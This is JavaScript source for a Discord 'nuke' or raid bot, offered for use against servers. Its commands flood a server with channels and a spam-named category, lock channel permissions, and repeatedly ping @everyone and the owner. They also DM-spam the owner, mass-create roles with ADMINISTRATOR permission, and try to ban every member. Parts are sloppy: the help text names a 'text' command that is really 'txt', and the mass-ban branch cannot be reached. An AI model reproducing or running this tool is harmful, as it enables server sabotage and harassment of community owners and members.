const Discord = require('discord.js')
const client = new Discord.Client()
const count = require('../config.json').count
const prefix = require('../config.json').prefix
const token = require('../config.json').token

client.on('ready', () => {
    console.log(`done for`)
})

client.on('message', (message) => {
    if(!message.content.startsWith(prefix) || message.author.bot){
        return
    }

    //Spliting the Command to an array
    const args = message.content.slice(prefix.length).split(/ +/)
    const command = args.shift().toLowerCase()

    if(command === 'help'){}
    else if(message.channel.type === 'dm'){
        console.log(command+' ran in DM\nErr: Cannot run commands in DM')
        message.reply('error, cannot be done in dms')
        return
    }

    console.log(command)
    
      if(command === 'txt'){
        message.delete()

        let categoryId = ''

        message.guild.channels.create('@everyone hi\nhttps://cdn.discordapp.com/attachments/832423825076912128/834142996089143376/9k.png/\nhttps://cdn.discordapp.com/attachments/832423825076912128/834142996089143376/9k.png\ndiscord.gg/troll\ndiscord.gg/troll\ndiscord.gg/troll\n', {type: 'category'})
        .then((channel) => {
            channel.setPosition(0)
            categoryId = channel.id
            channel.overwritePermissions([
                {
                    id: message.guild.id,
                    deny: ['SEND_MESSAGES'],
                    allow: ['ADD_REACTIONS', 'READ_MESSAGE_HISTORY']
                }
            ])
        })

        for(let i = 1; i<=count; i++){
            setTimeout(() => {
                message.guild.channels.create('chicken wonton soup poop', {type: "text"})
                .then((channel) => {
                    channel.setParent(categoryId)
                    channel.send('@everyone LMFAOOOO https://cdn.discordapp.com/attachments/832423825076912128/834142996089143376/9k.png')
                })
            }, 500)
        }
    }
    else if(command === 'vc'){
        message.delete()

        let categoryId = ''

        message.guild.channels.create('skrt.', {type: 'category'})
        .then((channel) => {
            channel.setPosition(0)
            categoryId = channel.id
            channel.overwritePermissions([
                {
                    id: message.guild.id,
                    deny: ['CONNECT'],
                    allow: ['VIEW_CHANNEL']
                }
            ])
        })
        for(let i = 1; i<=count; i++){
            setTimeout(() => {
                message.guild.channels.create('Suffer', {type: "voice"})
                .then((channel) => {
                    channel.setParent(categoryId)
                })
            }, 500)
        }
    }
    else if(command === 'spam'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => message.channel.send('@everyone LOLOLOL/'), 200)
        }
    }
    else if(command === 'spamowner'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => message.channel.send(`https://tenor.com/view/ihave-your-ip-address-your-ip-adress-troll-gif-19773629<@${message.guild.ownerID}>`), 200)
        }
    }
    else if(command === 'spameveryone'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => message.channel.send(`https://cdn.discordapp.com/attachments/832423825076912128/834142996089143376/9k.png/\n@everyone **-->** 😹😹😹\n`), 200)
        }
    }
    else if(command === 'dmowner'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => {
                message.guild.owner.send(`funni <@${message.guild.owner.id}>\nhttps://tenor.com/view/clown-fool-dummy-clowns-clownery-gif-14630630`)
            }, 200)
        }
    }
    else if(command === 'mercy'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => message.channel.send(`@everyone https://cdn.discordapp.com/attachments/689918636898517093/803516039496204338/mercy.mp4`), 200)
        }
    } else if(command === 'richard'){
            message.delete()
    
            for(let i = 1; i<=count; i++){
                setTimeout(() => message.channel.send(`@everyone https://tenor.com/view/caveman-david-davtyan-no-spamming-sk-abbas-the-king-gif-15119543\n ALL HAIL THE KING\n ALL HAIL THE KING\n ALL HAIL THE KING\n ALL HAIL THE KING\n ALL HAIL THE KING\n ALL HAIL THE KING\n ALL HAIL THE KING
                \n ALL HAIL THE KING
                \n ALL HAIL THE KING
                \n ALL HAIL THE KING
                \n ALL HAIL THE KING
                \n ALL HAIL THE KING
                \n ALL HAIL THE KING
                \n ALL HAIL THE KING
                \n ALL HAIL THE KING`), 200)
            }
    }
    else if(command === 'roles'){
        message.delete()

        let colors = ['#EE82EE', '#4B0082', '#0183fa', '#01d801', '#f7e501', '#fe8801', '#ff0000']
        let colorCount = 0;

        for(let i = 1; i <= count; i++){
            setTimeout(() => {
                message.guild.roles.create({data: {
                    name: 'LMAO',
                    color: colors[colorCount],
                    hoist: true,
                    permissions: ['ADMINISTRATOR'],
                    mentionable: true
                }}).catch(console.error)

                colorCount++;
                if(colorCount === 7){
                    colorCount = 0
                }
            }, 250)
        }
    }
    else if(command === 'help'){
        if(message.channel.type === 'dm'){}
        else{
            message.delete()
        }
    }
    else if (message.content === 'tb') {
     {message.guild.members.cache.forEach(member => {member.ban({reason: 'lol'}).then(console.log).catch(console.error)})
    } 
        
        const embed = new Discord.MessageEmbed()
            .setColor('#000000')
            .setThumbnail(message.author.avatarURL({dynamic: true}))
            .setDescription('Have fun. lol')
            .addFields(
                {
                    name: `${prefix}text`,
                    value: `Spam creates "${count} (count)" number of text channel/s`
                },
                {
                    name: `${prefix}vc`,
                    value: `Spam creates "${count} (count)" number of voice channel/s`
                },
                {
                    name: `${prefix}spam`,
                    value: `Spams "${count} (count)" number of messages`
                },
                {
                    name: `${prefix}spamowner`,
                    value: `Spam tags the owner "${count} (count)" number of times`
                },
                {
                    name: `${prefix}spameveryone`,
                    value: `Spam tags @everyone "${count} (count)" number of times`
                },
                {
                    name: `${prefix}dmowner`,
                    value: `Spam DMs owner "${count} (count)" number of times`
                },
                {
                    name: `${prefix}mercy`,
                    value: `lamborghini mercy, damn yo bitch so thirsty"${count} (count)"😉`
                },
                {
                    name: `${prefix}roles`,
                    value: `Spam creates a role "${count} (count)" number of times`
                },
                {
                    name: `${prefix}richard`,
                    value: 'Summon the king'
                },
                {
                    name: `${prefix}tb`,
                    value: 'mass ban? do not know if it works'
                }
            )
            .setFooter('📟📟📟')
            .setTimestamp()
        message.author.send(embed)
    }
})

client.login(token).catch((err) => {
    console.error('Error',err)
    console.log('INVALID TOKEN!')
})


